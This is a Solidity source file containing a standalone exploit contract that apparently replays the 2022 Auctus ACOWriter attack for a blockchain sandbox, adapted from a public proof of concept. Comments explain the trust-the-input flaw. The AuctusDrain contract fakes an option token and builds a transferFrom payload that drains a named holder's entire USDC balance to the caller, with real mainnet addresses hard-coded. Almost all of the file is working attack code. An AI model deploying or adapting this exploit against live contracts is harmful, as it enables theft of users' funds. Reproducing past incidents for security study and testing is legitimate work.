// SPDX-License-Identifier: UNLICENSED
// pragma ^0.8.10 — must compile with the registry forge project's solc.
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-03-Auctus).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// `ContractTest`, which inherits `MockACOToken` (so the test contract itself is
// both the attacker's entrypoint AND the fake "ACO token" it passes in). There is
// no standalone exploit contract to deploy, so we hand-author one here that
// faithfully copies the inline attack from test/Auctus_exp.sol::test() and the
// MockACOToken interface. Logic + constants are copied verbatim.
//
// Root cause (trust-the-input): ACOWriter.write() accepts an ARBITRARY `acoToken`
// address and trusts the *return values of methods on that address*
// (collateral() / strikeAsset() / mintToPayable() / balanceOf() / transfer()) to
// drive real token movements, AND it blindly `call`s an attacker-supplied
// `exchangeAddress` with attacker-supplied `exchangeData` forwarding its whole
// balance. With no whitelist / genuine-option check, an attacker only has to BE a
// contract that lies about collateral/strike: it passes ITSELF as the acoToken and
// hands the writer a `transferFrom(victimHolder, msg.sender, victimBalance)`
// payload targeting the privileged USDC proxy as the "exchange". The writer
// happily executes it, pulling ~682,255 USDC from a protocol-held holder to the
// attacker in a single call.

interface IACOWriter {
    function write(
        address acoToken,
        uint256 collateralAmount,
        address exchangeAddress,
        bytes calldata exchangeData
    ) external payable;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract AuctusDrain {
    // Real mainnet constants (copied verbatim from the Foundry test).
    address constant ACOWRITER = 0xE7597F774fD0a15A617894dc39d45A28B97AFa4f;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    // A protocol-held holder whose USDC the privileged proxy could move from.
    address constant VICTIM_HOLDER = 0xCB32033c498b54818e58270F341e5f6a3bce993B;

    // -----------------------------------------------------------------------
    // Fake "ACO token" interface — what ACOWriter.write() reads off the
    // attacker-supplied acoToken. Every method LIES so the writer's logic takes
    // the path the attacker wants:
    //   * collateral() == address(0)  -> `_isEther(_collateral)` is true, so the
    //     writer takes the ETH mint branch (mintToPayable) and does NOT pull any
    //     ERC-20 collateral from the caller up front.
    //   * strikeAsset() == address(this) -> after the "sale", the writer tries to
    //     transfer the (fake) strike token to the caller; our transfer() is a
    //     no-op that returns true.
    //   * balanceOf()/approve()/transfer()/mintToPayable() are stubbed so the
    //     writer's internal accounting calls all succeed.
    // -----------------------------------------------------------------------
    function collateral() external view returns (address) {
        return address(0);
    }

    function strikeAsset() external view returns (address) {
        return address(this);
    }

    function mintToPayable(address) external payable returns (uint256) {
        return 1;
    }

    function balanceOf(address) external view returns (uint256) {
        return 1;
    }

    function approve(address, uint256) external returns (bool) {
        return true;
    }

    function transfer(address, uint256) external returns (bool) {
        return true;
    }

    // -----------------------------------------------------------------------
    // Entrypoint. Mirrors ContractTest.test() verbatim: pass THIS contract as the
    // acoToken, send 1 wei (write requires msg.value > 0), name the USDC proxy as
    // the "exchange", and hand it a transferFrom that pulls the victim holder's
    // entire USDC balance to msg.sender (the attacker EOA).
    // -----------------------------------------------------------------------
    // `run()` is payable: the recorder sends 1 wei here (attackValueWei), and
    // run() forwards that same 1 wei into ACOWriter.write{value:1} — mirroring
    // the Foundry test where the test contract funds the internal write() call
    // from its own balance.
    function run() external payable {
        uint256 amount = IERC20(USDC).balanceOf(VICTIM_HOLDER);
        bytes memory exchangeData = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,uint256)")),
            VICTIM_HOLDER,
            msg.sender,
            amount
        );
        IACOWriter(ACOWRITER).write{value: 1}(address(this), 1, USDC, exchangeData);
    }
}
